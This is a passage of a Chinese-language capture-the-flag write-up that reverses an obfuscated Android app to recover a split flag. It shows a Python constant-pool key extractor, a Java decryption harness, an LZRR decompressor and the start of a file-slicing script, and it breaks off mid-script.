</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3080</span><span class=w>        </span><span class=n>flagImage</span><span class=o>/</span><span class=n>Image1Part5</span><span class=p>.</span><span class=n>java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>22774</span><span class=w>        </span><span class=n>flagImage</span><span class=o>/</span><span class=n>Image1Part6</span><span class=p>.</span><span class=n>java</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>flag被分成了六份，需要解密RSA并且解 LZRR 压缩</p><p>batch1和3的key加密不依赖于seed，流密码直接xor，然后key 是base64 字符串，存在 l1I.webp（类 i.l.l1I）的常量池里。</p><p>写个脚本提取一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span><span class=o>,</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>CLASS</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;app/src/main/res/mipmap-hdpi/l1I.webp&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read_bytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>utf8_strings</span><span class=p>(</span><span class=n>class_bytes</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cp_count</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&gt;H&#34;</span><span class=p>,</span> <span class=n>class_bytes</span><span class=p>,</span> <span class=mi>8</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>off</span> <span class=o>=</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>cp_count</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tag</span> <span class=o>=</span> <span class=n>class_bytes</span><span class=p>[</span><span class=n>off</span><span class=p>];</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>tag</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ln</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&gt;H&#34;</span><span class=p>,</span> <span class=n>class_bytes</span><span class=p>,</span> <span class=n>off</span><span class=p>)[</span><span class=mi>0</span><span class=p>];</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>            <span class=n>s</span>  <span class=o>=</span> <span class=n>class_bytes</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=n>ln</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=s2>&#34;replace&#34;</span><span class=p>);</span> <span class=n>off</span> <span class=o>+=</span> <span class=n>ln</span>
</span></span><span class=line><span class=cl>            <span class=n>res</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>tag</span> <span class=ow>in</span> <span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mi>4</span><span class=p>):</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>tag</span> <span class=ow>in</span> <span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mi>6</span><span class=p>):</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>tag</span> <span class=ow>in</span> <span class=p>(</span><span class=mi>7</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>16</span><span class=p>,</span><span class=mi>19</span><span class=p>,</span><span class=mi>20</span><span class=p>):</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>tag</span> <span class=ow>in</span> <span class=p>(</span><span class=mi>9</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>18</span><span class=p>):</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>tag</span> <span class=o>==</span> <span class=mi>15</span><span class=p>:</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span> <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=n>tag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cands</span> <span class=o>=</span> <span class=p>[</span><span class=n>s</span> <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=n>utf8_strings</span><span class=p>(</span><span class=n>CLASS</span><span class=p>)</span> <span class=k>if</span> <span class=n>s</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;azQyMw&#34;</span><span class=p>)</span> <span class=ow>and</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1000</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>cands</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Path</span><span class=p>(</span><span class=s2>&#34;key0.b64&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>write_text</span><span class=p>(</span><span class=n>cands</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Path</span><span class=p>(</span><span class=s2>&#34;key1.b64&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>write_text</span><span class=p>(</span><span class=n>cands</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>写一个decrypt.java去调用 <code>i.l.Runner.encrypt()</code>进行解密</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.nio.file.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>i.l.Runner</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Decrypt</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>args</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>4</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>err</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;Usage: java Decrypt &lt;key.b64&gt; &lt;seedHex(16)&gt; &lt;in.bin&gt; &lt;out.bin&gt;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>key</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getDecoder</span><span class=p>().</span><span class=na>decode</span><span class=p>(</span><span class=n>Files</span><span class=p>.</span><span class=na>readAllBytes</span><span class=p>(</span><span class=n>Paths</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>args</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>long</span><span class=w> </span><span class=n>seed</span><span class=w>  </span><span class=o>=</span><span class=w> </span><span class=n>Long</span><span class=p>.</span><span class=na>parseUnsignedLong</span><span class=p>(</span><span class=n>args</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>16</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>in</span><span class=w>  </span><span class=o>=</span><span class=w> </span><span class=n>Files</span><span class=p>.</span><span class=na>readAllBytes</span><span class=p>(</span><span class=n>Paths</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>args</span><span class=o>[</span><span class=n>2</span><span class=o>]</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>out</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runner</span><span class=p>.</span><span class=na>encrypt</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>in</span><span class=p>,</span><span class=w> </span><span class=n>seed</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Files</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>Paths</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>args</span><span class=o>[</span><span class=n>3</span><span class=o>]</span><span class=p>),</span><span class=w> </span><span class=n>out</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>然后seed随便给就行，类似于：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>java -cp work/recovered_classes:. Decrypt work/key1.b64 <span class=m>0000000000000000</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  work/batches/batch1_cipher.bin work/out/batch1_plain.bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>java -cp work/recovered_classes:. Decrypt work/key1.b64 <span class=m>0000000000000000</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  work/batches/batch3_cipher.bin work/out/batch3_plain.bin
</span></span></code></pre></td></tr></table></div></div><p>得到解密后的bin</p><p>Il1.Il1(byte[])` 是压缩器,解压缩:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span><span class=o>,</span> <span class=nn>zlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>_bit_iter</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>start</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>byte</span> <span class=ow>in</span> <span class=n>data</span><span class=p>[</span><span class=n>start</span><span class=p>:]:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>yield</span> <span class=p>(</span><span class=n>byte</span> <span class=o>&gt;&gt;</span> <span class=n>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>_read_bits</span><span class=p>(</span><span class=n>bits</span><span class=p>,</span> <span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>v</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>v</span> <span class=o>=</span> <span class=p>(</span><span class=n>v</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>|</span> <span class=nb>next</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>lzrr_decompress</span><span class=p>(</span><span class=n>comp</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>comp</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;too short&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>magic</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&gt;I&#34;</span><span class=p>,</span> <span class=n>comp</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>magic</span> <span class=o>!=</span> <span class=mh>0x4c5a5252</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;bad magic&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ver</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&gt;H&#34;</span><span class=p>,</span> <span class=n>comp</span><span class=p>,</span> <span class=mi>4</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ver</span> <span class=o>!=</span> <span class=mi>513</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;bad ver&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>orig_len</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&gt;I&#34;</span><span class=p>,</span> <span class=n>comp</span><span class=p>,</span> <span class=mi>8</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>crc</span>      <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&gt;I&#34;</span><span class=p>,</span> <span class=n>comp</span><span class=p>,</span> <span class=mi>12</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bits</span> <span class=o>=</span> <span class=n>_bit_iter</span><span class=p>(</span><span class=n>comp</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>out</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>orig_len</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>t</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>out</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>_read_bits</span><span class=p>(</span><span class=n>bits</span><span class=p>,</span> <span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># offset</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>next</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>offset</span> <span class=o>=</span> <span class=n>_read_bits</span><span class=p>(</span><span class=n>bits</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>offset</span> <span class=o>=</span> <span class=n>_read_bits</span><span class=p>(</span><span class=n>bits</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># length</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>next</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>length</span> <span class=o>=</span> <span class=mi>3</span> <span class=o>+</span> <span class=n>_read_bits</span><span class=p>(</span><span class=n>bits</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nb>next</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>length</span> <span class=o>=</span> <span class=mi>3</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>+</span> <span class=n>_read_bits</span><span class=p>(</span><span class=n>bits</span><span class=p>,</span> <span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>length</span> <span class=o>=</span> <span class=mi>3</span> <span class=o>+</span> <span class=n>_read_bits</span><span class=p>(</span><span class=n>bits</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>start</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>out</span><span class=p>)</span> <span class=o>-</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>out</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>out</span><span class=p>[</span><span class=n>start</span> <span class=o>+</span> <span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>out</span><span class=p>[:</span><span class=n>orig_len</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 可选校验</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>zlib</span><span class=o>.</span><span class=n>crc32</span><span class=p>(</span><span class=n>out</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=p>)</span> <span class=o>!=</span> <span class=n>crc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>out</span>
</span></span></code></pre></td></tr></table></div></div><p>文件表里给的是每个文件在“明文流”里的 offset。明文流结构就是：</p><p>[file0 LZRR blob][file1 LZRR blob][file2 LZRR blob]&mldr;需要文件切片</p><p>调用解码器去解压并切片：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>lzrr</span> <span class=kn>import</span> <span class=n>lzrr_decompress</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_file_table</span><span class=p>(</span><span class=n>path</span><span class=p>:</span> <span class=n>Path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>items</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>path</span><span class=o>.</span><span class=n>read_text</span><span class=p>(</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>splitlines</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>off</span><span class=p>,</span> <span class=n>name</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>items</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=nb>int</span><span class=p>(</span><span class=n>off</span><span class=p>),</span> <span class=n>name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>items</span><span class=o>.</span><span class=n>sort</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>items</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>unpack_one</span><span class=p>(</span><span class=n>batch_id</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>base</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;work&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=p>(</span><span class=n>base</span> <span class=o>/</span> <span class=s2>&#34;out&#34;</span> <span class=o>/</span> <span class=sa>f</span><span class=s2>&#34;batch</span><span class=si>{</span><span class=n>batch_id</span><span class=si>}</span><span class=s2>_plain.bin&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read_bytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>table</span> <span class=o>=</span> <span class=n>read_file_table</span><span class=p>(</span><span class=n>base</span> <span class=o>/</span> <span class=s2>&#34;batches&#34;</span> <span class=o>/</span> <span class=sa>f</span><span class=s2>&#34;batch</span><span class=si>{</span><span class=n>batch_id</span><span class=si>}</span><span class=s2>_files.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out_dir</span> <span class=o>=</span> <span class=n>base</span> <span class=o>/</span> <span class=s2>&#34;out&#34;</span> <span class=o>/</span> <span class=sa>f</span><span class=s2>&#34;batch</span><span class=si>{</span><span class=n>batch_id</span><span class=si>}</span><span class=s2>_files&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out_dir</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=n>parents</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
